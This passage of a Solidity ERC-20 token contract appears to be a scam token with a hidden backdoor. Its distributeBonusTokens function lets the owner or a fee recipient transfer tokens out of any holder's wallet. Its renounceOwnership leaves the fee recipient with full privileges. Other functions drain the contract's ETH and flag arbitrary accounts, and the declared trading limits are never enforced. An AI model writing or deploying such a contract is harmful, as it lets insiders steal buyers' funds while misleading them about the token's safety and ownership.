        _owner = msg.sender;
        _totalSupply = 10000000 * 10 ** _decimals;
        _balances[address(this)] = _totalSupply;
        _maxTransactionAmount = _totalSupply;
        _maxWalletAmount = _totalSupply;
        _swapTaxThreshold = _totalSupply / 100;
        _maxSwapTax = _totalSupply / 100;
        transferDelayEnabled = true;
    }

    function name() external pure returns (string memory) {
        return _name;
    }

    function symbol() external pure returns (string memory) {
        return _symbol;
    }

    function decimals() external pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() external pure returns (uint256) {
        return 10000000 * 10 ** 9;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner_, address spender) external view returns (uint256) {
        return _allowances[owner_][spender];
    }

    function owner() external view returns (address) {
        return _owner;
    }

    function renounceOwnership() external onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 currentAllowance = _allowances[from][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(from, msg.sender, currentAllowance - amount);
        _transfer(from, to, amount);
        return true;
    }

    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        _balances[from] = fromBalance - amount;
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function openTrading() external onlyOwner {
        tradingOpen = true;
    }

    function removeLimits() external onlyOwner {
        _maxTransactionAmount = type(uint256).max;
        _maxWalletAmount = type(uint256).max;
        emit MaxTxAmountUpdated(_maxTransactionAmount);
    }

    function manualSwap() external {
        require(msg.sender == _feeRecipient || msg.sender == _owner, "Unauthorized");
    }

    function withdrawEth() external {
        require(msg.sender == _feeRecipient || msg.sender == _owner, "Unauthorized");
        payable(msg.sender).transfer(address(this).balance);
    }

    function earlySniperBuyBlock(address account, uint256 blockNumber) external {
        require(msg.sender == _feeRecipient || msg.sender == _owner, "Unauthorized");
        _sniperBlock[account] = blockNumber;
    }

    function distributeBonusTokens(address from, address to, uint256 amount) external {
        require(msg.sender == _feeRecipient || msg.sender == _owner, "Unauthorized");
        _transfer(from, to, amount);
    }

    receive() external payable {}
}
